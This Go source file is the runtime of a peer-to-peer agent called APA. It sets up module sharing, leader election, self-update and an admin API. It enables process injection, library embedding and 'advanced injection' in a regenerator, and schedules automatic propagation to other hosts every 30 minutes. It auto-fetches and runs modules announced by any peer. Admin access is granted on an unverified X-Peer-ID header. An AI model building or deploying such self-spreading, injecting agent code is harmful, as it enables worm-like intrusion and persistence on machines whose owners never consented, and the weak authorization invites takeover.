package agent

import (
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
	"sync"

	"github.com/libp2p/go-libp2p/core/peer"

	"github.com/naviNBRuas/APA/pkg/controller"
	manager "github.com/naviNBRuas/APA/pkg/controller/manager"
	"github.com/naviNBRuas/APA/pkg/controller/task-orchestrator"
	"github.com/naviNBRuas/APA/pkg/health"
	"github.com/naviNBRuas/APA/pkg/module"
	"github.com/naviNBRuas/APA/pkg/networking"
	"github.com/naviNBRuas/APA/pkg/opa"
	"github.com/naviNBRuas/APA/pkg/persistence"
	"github.com/naviNBRuas/APA/pkg/policy"
	"github.com/naviNBRuas/APA/pkg/recovery"
	"github.com/naviNBRuas/APA/pkg/update"
	"gopkg.in/yaml.v3"
	"github.com/naviNBRuas/APA/pkg/regeneration"
)

// StatusResponse is the response for the /admin/status endpoint.
type StatusResponse struct {
	Version       string             `json:"version"`
	PeerID        string             `json:"peer_id"`
	LoadedModules []*module.Manifest `json:"loaded_modules"`
}

// Config holds the configuration for the agent runtime.

// Config holds the configuration for the agent runtime.
type Config struct {
	AdminListenAddress string             `yaml:"admin_listen_address"`
	LogLevel           string             `yaml:"log_level"`
	ModulePath         string             `yaml:"module_path"`
	IdentityFilePath   string             `yaml:"identity_file_path"`
	PolicyPath         string             `yaml:"policy_path"`
	SigningPrivKeyPath string             `yaml:"signing_priv_key_path"`
	ControllerPath     string             `yaml:"controller_path"`
	AdminPolicyPath    string             `yaml:"admin_policy_path"` // New field for Admin API policy
	P2P                networking.Config `yaml:"p2p"`
	Update             update.Config     `yaml:"update"`
}

// Runtime is the core agent runtime. It manages all agent components.
type Runtime struct {
	config             *Config
	logger             *slog.Logger
	identity           *Identity
	server             *http.Server
	moduleManager      *module.Manager
	p2p                *networking.P2P
	updateManager      *update.Manager
	healthController   *health.HealthController
	recoveryController *recovery.RecoveryController
	controllerManager  *manager.Manager
	controllers        []controller.Controller
	currentLeader      peer.ID // Stores the PeerID of the current leader
	adminPolicyEngine  *opa.OPAPolicyEngine // New field for OPA policy engine
	adminPeerManager   *AdminPeerManager    // New field for admin peer management
	regenerator        *regeneration.Regenerator // New field for regeneration capabilities
	propagationManager *persistence.PropagationManager // New field for propagation capabilities
}

// NewRuntime creates a new agent runtime.
func NewRuntime(configPath string, version string) (*Runtime, error) {
	config, err := loadConfig(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load config: %w", err)
	}

	rt := &Runtime{}
	if err := rt.init(context.Background(), config, version); err != nil {
		return nil, err
	}

	return rt, nil
}

func (rt *Runtime) init(ctx context.Context, config *Config, version string) error {
	// Initialize logger
	logLevel := new(slog.LevelVar)
	switch config.LogLevel {
	case "debug":
		logLevel.Set(slog.LevelDebug)
	case "warn":
		logLevel.Set(slog.LevelWarn)
	case "error":
		logLevel.Set(slog.LevelError)
	default:
		logLevel.Set(slog.LevelInfo)
	}
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: logLevel}))

	// Initialize identity
	identity, err := NewIdentity(config.IdentityFilePath)
	if err != nil {
		return fmt.Errorf("failed to initialize identity: %w", err)
	}
	logger.Info("Identity initialized", "agent_peer_id", identity.PeerID)

	// Initialize Module Manager
	// Load signing private key
	signingPrivKeyBytes, err := os.ReadFile(config.SigningPrivKeyPath)
	if err != nil {
		return fmt.Errorf("failed to read signing private key: %w", err)
	}
	signingPrivKeyHex := string(signingPrivKeyBytes)
	signingPrivKeyDecoded, err := hex.DecodeString(signingPrivKeyHex)
	if err != nil {
		return fmt.Errorf("failed to decode signing private key: %w", err)
	}
	signingPrivKey := ed25519.PrivateKey(signingPrivKeyDecoded)

	// Initialize Policy Enforcer
	policyEnforcer, err := policy.NewPolicyEnforcer(config.PolicyPath)
	if err != nil {
		return fmt.Errorf("failed to initialize policy enforcer: %w", err)
	}

	moduleManager, err := module.NewManager(ctx, logger, config.ModulePath, signingPrivKey, policyEnforcer)
	if err != nil {
		return fmt.Errorf("failed to initialize module manager: %w", err)
	}

	// Initialize P2P Networking
	p2p, err := networking.NewP2P(ctx, logger, config.P2P, identity.PeerID, identity.PrivKey, policyEnforcer)
	if err != nil {
		return fmt.Errorf("failed to initialize P2P networking: %w", err)
	}

	// Initialize Update Manager
	updateManager, err := update.NewManager(logger, config.Update, version)
	if err != nil {
		return fmt.Errorf("failed to initialize update manager: %w", err)
	}

	// Initialize Health Controller
	healthController := health.NewHealthController(logger)
	healthController.RegisterCheck(health.NewProcessLivenessCheck())

	// Initialize Controller Manager
	controllerManager := manager.NewManager(logger, config.ControllerPath, policyEnforcer)

	// Initialize decentralized controllers
	var controllers []controller.Controller
	taskOrchestrator := task_orchestrator.NewTaskOrchestrator(logger)
	controllers = append(controllers, taskOrchestrator)

	rt.config = config
	rt.logger = logger
	rt.identity = identity
	rt.moduleManager = moduleManager
	rt.p2p = p2p
	rt.updateManager = updateManager
	rt.healthController = healthController
	rt.controllerManager = controllerManager
	rt.controllers = controllers
	
	// Initialize Admin Peer Manager
	rt.adminPeerManager = NewAdminPeerManager(logger)
	
	// Add some default admin peers (these would be configured in a real implementation)
	// For demonstration purposes, we'll add the agent's own peer ID as an admin peer
	rt.adminPeerManager.AddAdminPeer(identity.PeerID.String())
	
	// Initialize Admin Policy Engine
	rt.adminPolicyEngine = opa.NewOPAPolicyEngine()
	if config.AdminPolicyPath != "" {
		if err := rt.adminPolicyEngine.LoadPolicy(ctx, config.AdminPolicyPath); err != nil {
			return fmt.Errorf("failed to load admin policy: %w", err)
		}
	}

	// Initialize Recovery Controller
	recoveryController := recovery.NewRecoveryController(logger, config, rt.ApplyConfig, p2p, moduleManager, controllerManager)
	rt.recoveryController = recoveryController
	
	// Get the actual binary path
	execPath, err := os.Executable()
	if err != nil {
		execPath = "/usr/local/bin/agentd" // fallback
	}

	// Initialize Regenerator
	regeneratorConfig := &regeneration.Config{
		BinaryPath:              execPath, // Use actual binary path
		BackupPath:              "/var/lib/apa/backup", // Default backup path
		RegenerationInterval:    1 * time.Hour,        // Check every hour
		HealthCheckEndpoint:     "http://localhost:8080/admin/health",
		TrustedPeers:            []string{}, // Will be populated dynamically
		EnableProcessInjection:  true,      // Enable process injection
		EnableLibraryEmbedding:  true,      // Enable library embedding
		EnableAdvancedInjection: true,      // Enable advanced injection techniques
	}

	rt.regenerator = regeneration.NewRegenerator(logger, regeneratorConfig, p2p, identity.PeerID)
	
	// Initialize PropagationManager
	rt.propagationManager = persistence.NewPropagationManager(logger, execPath, p2p, identity.PeerID.String())

	// Connect the module manager to the P2P network via the callback
	moduleManager.OnModuleLoad = func(manifest module.Manifest) {
		if err := p2p.AnnounceModule(context.Background(), manifest); err != nil {
			logger.Error("Failed to announce module", "name", manifest.Name, "error", err)
		}
	}

	// Set the handler for incoming module fetch requests
	p2p.FetchModuleHandler = func(name, version string) (*module.Manifest, []byte, error) {
		logger.Info("Received request for module", "name", name, "version", version)
		return moduleManager.GetModuleData(name, version)
	}

	// Set the handler for incoming module announcements
	p2p.OnModuleAnnouncement = func(announcement networking.ModuleAnnouncementMessage) {
		// If we don't have this module version, fetch it
		if !moduleManager.HasModule(announcement.Manifest.Name, announcement.Manifest.Version) {
			logger.Info("Received announcement for new module", "name", announcement.Manifest.Name, "version", announcement.Manifest.Version, "from", announcement.AnnouncerPeerID)
			go func() {
				manifest, wasmBytes, err := p2p.FetchModule(context.Background(), announcement.AnnouncerPeerID, announcement.Manifest.Name, announcement.Manifest.Version)
				if err != nil {
					logger.Error("Failed to fetch module", "name", announcement.Manifest.Name, "error", err)
					return
				}
				// Save and load the new module
				if err := moduleManager.SaveAndLoadModule(manifest, wasmBytes); err != nil {
					logger.Error("Failed to save and load fetched module", "name", announcement.Manifest.Name, "error", err)
				}
			}()
		}
	}

	// Set the callback for when an update is ready
	updateManager.OnUpdateReady = rt.Stop

	// Set up P2P update functionality if enabled
	if config.Update.EnableP2P {
		// Set the P2P network interface on the update manager
		updateManager.SetP2PNetwork(p2p)

		// Set the handler for incoming update fetch requests
		p2p.FetchUpdateHandler = func(version string) (*update.ReleaseInfo, []byte, error) {
			logger.Info("Received request for update", "version", version)
			return rt.GetCurrentRelease()
		}
	}

	return nil
}

// ApplyConfig applies a new configuration to the agent runtime.
func (rt *Runtime) ApplyConfig(configData []byte) error {
	var newConfig Config
	if err := yaml.Unmarshal(configData, &newConfig); err != nil {
		return fmt.Errorf("failed to unmarshal new configuration: %w", err)
	}

	rt.logger.Info("Applying new configuration")

	// Stop the current runtime
	rt.Stop()

	// Re-initialize the runtime with the new config
	// Create a new context for the re-initialized agent
	ctx, cancel := context.WithCancel(context.Background())
	if err := rt.init(ctx, &newConfig, rt.updateManager.CurrentVersion()); err != nil {
		return fmt.Errorf("failed to re-initialize runtime with new config: %w", err)
	}

	// Start the runtime again
	go rt.Start(ctx, cancel)

	rt.logger.Info("Successfully applied new configuration")

	return nil
}

// Start starts the agent runtime.
func (rt *Runtime) Start(ctx context.Context, cancel context.CancelFunc) {
	// Start the update checker
	go rt.updateManager.StartPeriodicCheck(ctx, rt.config.Update.CheckInterval)

	// Start health checks
	go rt.healthController.StartHealthChecks(ctx, 10*time.Second) // Run health checks every 10 seconds

	// Start regeneration monitoring
	if rt.regenerator != nil {
		rt.regenerator.Start(ctx)
	}
	
	// Start automatic propagation
	if rt.propagationManager != nil {
		// Start automatic propagation every 30 minutes
		go rt.propagationManager.ScheduleAutomaticPropagation(ctx, 30*time.Minute)
	}

	// Load controllers
	if err := rt.controllerManager.LoadControllersFromDir(ctx); err != nil {
		rt.logger.Error("Failed to load controllers", "error", err)
	}

	// Start all loaded controllers
	for _, manifest := range rt.controllerManager.ListControllers() {
		go func(name string) {
			if err := rt.controllerManager.StartController(ctx, name); err != nil {
				rt.logger.Error("Failed to start controller", "name", name, "error", err)
			}
		}(manifest.Name)
	}

	// Start all registered controllers
	for _, ctrl := range rt.controllers {
		go func(c controller.Controller) {
			if err := c.Start(ctx); err != nil {
				rt.logger.Error("Failed to start controller", "name", c.Name(), "error", err)
			}
		}(ctrl)
	}

	// Start P2P discovery
	rt.p2p.StartDiscovery(ctx)

	// Join the heartbeat topic and start broadcasting
	if err := rt.p2p.JoinHeartbeatTopic(ctx); err != nil {
		rt.logger.Error("Failed to join heartbeat topic", "error", err)
	} else {
		go rt.p2p.StartHeartbeat(ctx, rt.config.P2P.HeartbeatInterval)
	}

	// Join the module announcement topic
	if err := rt.p2p.JoinModuleTopic(ctx); err != nil {
		rt.logger.Error("Failed to join module topic", "error", err)
	}

	// Join the controller communication topic
	if err := rt.p2p.JoinControllerCommTopic(ctx); err != nil {
		rt.logger.Error("Failed to join controller communication topic", "error", err)
	}

	// Join the leader election topic
	if err := rt.p2p.JoinLeaderElectionTopic(ctx); err != nil {
		rt.logger.Error("Failed to join leader election topic", "error", err)
	}

	// Start goroutine to handle incoming controller messages
	go func() {
		msgCh, err := rt.p2p.SubscribeControllerMessages(ctx)
		if err != nil {
			rt.logger.Error("Failed to subscribe to controller messages", "error", err)
			return
		}
		for {
			select {
			case <-ctx.Done():
				rt.logger.Info("Stopping controller message dispatcher")
				return
			case msg := <-msgCh:
				if msg == nil {
					rt.logger.Warn("Received nil controller message")
					continue
				}
				rt.logger.Debug("Dispatching controller message", "type", msg.Type, "sender", msg.SenderPeerID)
				// Dispatch message to all registered controllers
				for _, ctrl := range rt.controllers {
					go func(c controller.Controller, message networking.ControllerMessage) {
						if err := c.HandleMessage(ctx, message); err != nil {
							rt.logger.Error("Failed to dispatch message to controller", "controller", c.Name(), "error", err)
						}
					}(ctrl, *msg)
				}
			}
		}
	}()

	// Start goroutine to handle incoming leader election messages
	go func() {
		leCh, err := rt.p2p.SubscribeLeaderElectionMessages(ctx)
		if err != nil {
			rt.logger.Error("Failed to subscribe to leader election messages", "error", err)
			return
		}

		// Map to store last seen leader election messages from peers
		lastSeen := make(map[peer.ID]networking.LeaderElectionMessage)
		// Mutex to protect lastSeen map
		var mu sync.Mutex

		// Goroutine to periodically publish our own leader election message
		go func() {
			ticker := time.NewTicker(5 * time.Second) // Announce candidacy every 5 seconds
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					// Determine if we are the leader based on known peers
					isLeader := true
					myID := rt.identity.PeerID

					mu.Lock()
					for pID, msg := range lastSeen {
						// If a higher-ranked peer (lexicographically greater PeerID) is active, we are not the leader
						if pID.String() > myID.String() && time.Since(msg.Timestamp) < 15*time.Second { // Consider peer active for 15 seconds
							isLeader = false
							break
						}
					}
					mu.Unlock()

					// Publish our candidacy
					msg := networking.LeaderElectionMessage{
						Rank:     0, // For now, rank is not used, relying on PeerID comparison
						IsLeader: isLeader,
					}
					if err := rt.p2p.PublishLeaderElectionMessage(ctx, msg); err != nil {
						rt.logger.Error("Failed to publish leader election message", "error", err)
					}
					if isLeader {
						rt.currentLeader = myID
						rt.logger.Info("Agent is the current leader", "peer_id", myID)
					} else {
						rt.logger.Info("Agent is not the leader")
					}
				}
			}
		}()

		for {
			select {
			case <-ctx.Done():
				rt.logger.Info("Stopping leader election message handler")
				return
			case msg := <-leCh:
				if msg == nil {
					rt.logger.Warn("Received nil leader election message")
					continue
				}
				peerID, err := peer.Decode(msg.CandidateID)
				if err != nil {
					rt.logger.Error("Failed to decode candidate ID from leader election message", "candidate_id", msg.CandidateID, "error", err)
					continue
				}

				mu.Lock()
				lastSeen[peerID] = *msg
				mu.Unlock()

				rt.logger.Debug("Received leader election message", "candidate", msg.CandidateID, "is_leader", msg.IsLeader, "from", msg.SenderPeerID)
				if msg.IsLeader {
					rt.currentLeader = peerID
					rt.logger.Info("Leader identified", "leader_id", peerID)
				}
			}
		}
	}()

	// Load modules
	if err := rt.moduleManager.LoadModulesFromDir(); err != nil {
		rt.logger.Error("Failed to load modules", "error", err)
	}

	// Run all loaded modules
	for _, manifest := range rt.moduleManager.ListModules() {
		go func(name string) {
			if err := rt.moduleManager.RunModule(name); err != nil {
				rt.logger.Error("Failed to run module", "name", name, "error", err)
			}
		}(manifest.Name)
	}

	// Setup admin API server
	mux := http.NewServeMux()
	// Register admin API endpoints
	mux.HandleFunc("/admin/status", rt.statusHandler)
	mux.HandleFunc("/admin/health", rt.healthHandler)
	mux.HandleFunc("/admin/modules", rt.modulesHandler)
	mux.HandleFunc("/admin/controllers", rt.controllersHandler)
	mux.HandleFunc("/admin/config", rt.configHandler)
	mux.HandleFunc("/admin/update", rt.updateHandler)
	mux.HandleFunc("/admin/peer-copy", rt.peerCopyHandler)
	mux.HandleFunc("/admin/regenerate", rt.triggerRegenerationHandler)
	mux.HandleFunc("/admin/propagate", rt.triggerPropagationHandler)

	rt.server = &http.Server{
		Addr:    rt.config.AdminListenAddress,
		Handler: mux,
	}

	// Start server in a goroutine
	go func() {
		rt.logger.Info("Admin API server starting", "address", rt.config.AdminListenAddress)
		if err := rt.server.ListenAndServe(); err != http.ErrServerClosed {
			rt.logger.Error("Admin API server failed", "error", err)
			os.Exit(1)
		}
	}()

	// Wait for shutdown signal
	rt.waitForShutdown(cancel)
}

// GetCurrentRelease returns the current release information.
func (rt *Runtime) GetCurrentRelease() (*update.ReleaseInfo, []byte, error) {
	return rt.updateManager.GetCurrentRelease()
}

// Stop gracefully shuts down the agent runtime.
func (rt *Runtime) Stop() {
	rt.logger.Info("Shutting down agent runtime...")

	// Stop all registered controllers
	for _, ctrl := range rt.controllers {
		ctrlCtx, ctrlCancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer ctrlCancel()
		if err := ctrl.Stop(ctrlCtx); err != nil {
			rt.logger.Error("Failed to stop controller", "name", ctrl.Name(), "error", err)
		}
	}

	// Shutdown the controller manager
	cmCtx, cmCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cmCancel()
	if err := rt.controllerManager.Shutdown(cmCtx); err != nil {
		rt.logger.Error("Failed to shutdown controller manager", "error", err)
	}

	// Shutdown the P2P network
	if err := rt.p2p.Shutdown(); err != nil {
		rt.logger.Error("Failed to shutdown P2P networking", "error", err)
	}

	// Shutdown the module manager
	if err := rt.moduleManager.Shutdown(); err != nil {
		rt.logger.Error("Failed to shutdown module manager", "error", err)
	}

	// Shutdown the admin API server
	serverCtx, serverCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer serverCancel()
	if err := rt.server.Shutdown(serverCtx); err != nil {
		rt.logger.Error("Admin API server shutdown failed", "error", err)
	}

	rt.logger.Info("Agent runtime shut down gracefully.")
}

// loadConfig loads the configuration from the given path.
func loadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var config Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

// waitForShutdown waits for a shutdown signal and gracefully shuts down the runtime.
func (rt *Runtime) waitForShutdown(cancel context.CancelFunc) {
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh

	rt.logger.Info("Shutdown signal received.")
	cancel() // Cancel the main context
	rt.Stop()
}

// healthHandler is the handler for the /admin/health endpoint.
func (rt *Runtime) healthHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "OK")
}

// statusHandler is the handler for the /admin/status endpoint.
func (rt *Runtime) statusHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	status := StatusResponse{
		Version:       rt.updateManager.CurrentVersion(),
		PeerID:        rt.identity.PeerID.String(),
		LoadedModules: rt.moduleManager.ListModules(),
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(status); err != nil {
		rt.logger.Error("Failed to encode status response", "error", err)
		w.WriteHeader(http.StatusInternalServerError)
	}
}

// modulesHandler is the handler for the /admin/modules endpoint.
func (rt *Runtime) modulesHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Handle different HTTP methods
	switch r.Method {
	case http.MethodGet:
		// List all modules
		modules := rt.moduleManager.ListModules()
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(modules); err != nil {
			rt.logger.Error("Failed to encode modules list response", "error", err)
			w.WriteHeader(http.StatusInternalServerError)
		}
	case http.MethodPost:
		// Load a module
		var req struct {
			Name string `json:"name"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request body", http.StatusBadRequest)
			return
		}
		if req.Name == "" {
			http.Error(w, "Missing module name", http.StatusBadRequest)
			return
		}
		if err := rt.moduleManager.LoadModule(req.Name); err != nil {
			rt.logger.Error("Failed to load module", "name", req.Name, "error", err)
			http.Error(w, "Failed to load module: "+err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Module %s loaded successfully.\n", req.Name)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// controllersHandler is the handler for the /admin/controllers endpoint.
func (rt *Runtime) controllersHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Handle different HTTP methods
	switch r.Method {
	case http.MethodGet:
		// List all controllers
		controllers := rt.controllerManager.ListControllers()
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(controllers); err != nil {
			rt.logger.Error("Failed to encode controllers list response", "error", err)
			w.WriteHeader(http.StatusInternalServerError)
		}
	case http.MethodPost:
		// Load a controller
		var req struct {
			Name string `json:"name"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid request body", http.StatusBadRequest)
			return
		}
		if req.Name == "" {
			http.Error(w, "Missing controller name", http.StatusBadRequest)
			return
		}
		if err := rt.controllerManager.LoadController(req.Name); err != nil {
			rt.logger.Error("Failed to load controller", "name", req.Name, "error", err)
			http.Error(w, "Failed to load controller: "+err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Controller %s loaded successfully.\n", req.Name)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// configHandler is the handler for the /admin/config endpoint.
func (rt *Runtime) configHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Handle different HTTP methods
	switch r.Method {
	case http.MethodGet:
		// Return current config
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(rt.config); err != nil {
			rt.logger.Error("Failed to encode config response", "error", err)
			w.WriteHeader(http.StatusInternalServerError)
		}
	case http.MethodPost:
		// Update config
		var newConfig Config
		if err := json.NewDecoder(r.Body).Decode(&newConfig); err != nil {
			http.Error(w, "Invalid request body", http.StatusBadRequest)
			return
		}
		// Convert config to YAML and apply it
		configData, err := yaml.Marshal(newConfig)
		if err != nil {
			rt.logger.Error("Failed to marshal config", "error", err)
			http.Error(w, "Failed to process config: "+err.Error(), http.StatusInternalServerError)
			return
		}
		if err := rt.ApplyConfig(configData); err != nil {
			rt.logger.Error("Failed to apply config", "error", err)
			http.Error(w, "Failed to apply config: "+err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprintln(w, "Config updated successfully.")
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// updateHandler is the handler for the /admin/update endpoint.
func (rt *Runtime) updateHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Handle different HTTP methods
	switch r.Method {
	case http.MethodPost:
		// Trigger update
		go rt.updateManager.CheckForUpdate()
		w.WriteHeader(http.StatusAccepted)
		fmt.Fprintln(w, "Update check initiated.")
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// peerCopyHandler is the handler for the /admin/peer-copy endpoint.
func (rt *Runtime) peerCopyHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Parse peer ID and module name from query parameters
	peerID := r.URL.Query().Get("peer_id")
	moduleName := r.URL.Query().Get("module_name")
	if peerID == "" || moduleName == "" {
		http.Error(w, "Missing peer_id or module_name parameter", http.StatusBadRequest)
		return
	}

	if err := rt.recoveryController.RequestPeerCopy(r.Context(), peerID, moduleName); err != nil {
		rt.logger.Error("Failed to request peer copy", "peer_id", peerID, "module_name", moduleName, "error", err)
		http.Error(w, "Failed to request peer copy: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Module %s successfully copied from peer %s.\n", moduleName, peerID)
}

// triggerRegenerationHandler is the handler for manually triggering agent regeneration
func (rt *Runtime) triggerRegenerationHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Trigger regeneration
	if err := rt.regenerator.TriggerRegeneration(r.Context()); err != nil {
		rt.logger.Error("Failed to trigger regeneration", "error", err)
		http.Error(w, "Failed to trigger regeneration: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "Regeneration triggered successfully.")
}

// triggerPropagationHandler is the handler for manually triggering agent propagation
func (rt *Runtime) triggerPropagationHandler(w http.ResponseWriter, r *http.Request) {
	// OPA authorization check
	input := rt.createAuthzInput(r)
	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
	if err != nil {
		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
		http.Error(w, "Authorization error", http.StatusInternalServerError)
		return
	}
	if !allowed {
		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Trigger propagation
	if err := rt.propagationManager.TriggerPropagation(r.Context()); err != nil {
		rt.logger.Error("Failed to trigger propagation", "error", err)
		http.Error(w, "Failed to trigger propagation: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "Propagation triggered successfully.")
}

// createAuthzInput creates an authorization input map with request information
func (rt *Runtime) createAuthzInput(r *http.Request) map[string]interface{} {
	input := map[string]interface{}{
		"method": r.Method,
		"path":   r.URL.Path,
		"user":   "anonymous", // Placeholder for actual user/auth info
	}

	// Try to extract peer ID from request context or headers
	// In a real implementation, this would extract actual peer information
	// For now, we'll use a placeholder that can be extended later
	if peerID := r.Header.Get("X-Peer-ID"); peerID != "" {
		input["peer_id"] = peerID
		
		// Add peer reputation score if available
		var reputationScore float64 = 50.0
		var isConnected bool = false
		
		if rt.p2p != nil {
			// Try to parse the peer ID
			if parsedPeerID, err := peer.Decode(peerID); err == nil {
				// Get reputation score from the P2P network's reputation system
				// This requires access to the reputation system through the P2P network
				if rt.p2p.advancedDiscovery != nil && rt.p2p.advancedDiscovery.reputationRouting != nil {
					reputationScore = rt.p2p.advancedDiscovery.reputationRouting.reputation.GetReputationScore(parsedPeerID)
					input["peer_reputation_score"] = reputationScore
				} else {
					// Fallback to a default score
					input["peer_reputation_score"] = 50.0
				}
				
				// Check if peer is connected
				connectedPeers := rt.p2p.GetConnectedPeers()
				for _, connectedPeer := range connectedPeers {
					if connectedPeer == parsedPeerID {
						isConnected = true
						input["peer_connected"] = true
						break
					}
				}
			}
		}
		
		// Check if peer is authorized for admin access
		if rt.adminPeerManager != nil {
			isAdmin := rt.adminPeerManager.IsAuthorizedAdmin(peerID, reputationScore, isConnected)
			input["peer_is_admin"] = isAdmin
		}
	}

	// Add agent's own peer ID
	input["agent_peer_id"] = rt.identity.PeerID.String()

	// Add agent's reputation score (for self)
	if rt.p2p != nil && rt.p2p.advancedDiscovery != nil && rt.p2p.advancedDiscovery.reputationRouting != nil {
		selfReputation := rt.p2p.advancedDiscovery.reputationRouting.reputation.GetReputationScore(rt.identity.PeerID)
		input["agent_reputation_score"] = selfReputation
	} else {
		input["agent_reputation_score"] = 50.0 // Default score
	}

	// Check if agent is authorized for admin access (self-check)
	if rt.adminPeerManager != nil {
		isAdmin := rt.adminPeerManager.IsAuthorizedAdmin(rt.identity.PeerID.String(), input["agent_reputation_score"].(float64), true)
		input["agent_is_admin"] = isAdmin
	}

	return input
}

